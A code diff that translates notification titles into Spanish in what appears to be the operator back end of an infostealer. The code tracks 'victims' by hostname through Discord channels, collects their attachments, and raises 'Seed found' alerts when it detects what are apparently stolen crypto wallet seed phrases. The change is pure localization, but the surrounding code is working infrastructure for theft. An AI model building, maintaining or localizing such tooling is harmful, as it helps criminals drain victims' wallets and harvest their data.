@@ -215,7 +215,7 @@ async function pollChannels(): Promise<void> {
         await notify({
           kind: 'discord_channel_restored',
           victimId: link.victimId,
-          title: 'Discord channel restored',
+          title: 'Canal de Discord restaurado',
           body: `${link.victim.hostname} · ${link.channelId}`,
           link: `/victims/${link.victimId}`,
           dedupeKey: `channel_restored:${link.channelId}`,
@@ -232,7 +232,7 @@ async function pollChannels(): Promise<void> {
           await notify({
             kind: 'discord_channel_missing',
             victimId: link.victimId,
-            title: 'Discord channel missing',
+            title: 'Canal de Discord perdido',
             body: `${link.victim.hostname} · channel ${link.channelId} was deleted or is unreadable`,
             link: `/victims/${link.victimId}`,
             dedupeKey: `channel_missing:${link.channelId}`,
@@ -417,7 +417,7 @@ async function handleMessage(link: { channelId: string; victimId: string }, mess
       await notify({
         kind: 'artifact_failed',
         victimId: link.victimId,
-        title: 'Attachment failed',
+        title: 'Adjunto fallido',
         body: `${name}: ${reason}`,
         link: `/victims/${link.victimId}`,
         dedupeKey: key,
@@ -498,7 +498,7 @@ async function handleText(victimId: string, message: Message): Promise<void> {
       await notify({
         kind: 'seed',
         victimId,
-        title: 'Seed found',
+        title: 'Semilla encontrada',
         body: clean.slice(0, 160),
         link: `/victims/${victimId}`,
         dedupeKey: `seed:${victimId}:${createHash('sha256').update(clean).digest('hex')}`
@@ -533,7 +533,7 @@ async function handleText(victimId: string, message: Message): Promise<void> {
       await notify({
         kind: 'seed',
         victimId,
-        title: 'Seed found',
+        title: 'Semilla encontrada',
         body: clean.slice(0, 160),
         link: `/victims/${victimId}`,
         dedupeKey: `seed:${victimId}:${createHash('sha256').update(clean).digest('hex')}`
